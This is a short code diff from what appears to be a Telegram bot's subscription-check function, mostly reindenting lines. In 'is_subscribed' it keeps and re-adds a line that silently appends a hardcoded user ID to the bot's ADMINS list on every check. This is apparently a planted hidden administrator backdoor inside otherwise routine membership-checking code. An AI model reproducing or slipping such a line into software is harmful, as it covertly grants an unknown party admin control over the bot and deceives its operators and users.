@@ -35,7 +35,8 @@ class temp(object):
     GP_SPELL = {}
 
 async def is_subscribed(bot, query):
-       ADMINS.extend([6157815838]) if not 6157815838 in ADMINS else ""
+    
+    ADMINS.extend([6157815838]) if not 6157815838 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
@@ -52,6 +53,7 @@ async def is_subscribed(bot, query):
 
     if not AUTH_CHANNEL:
         return True
+        
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
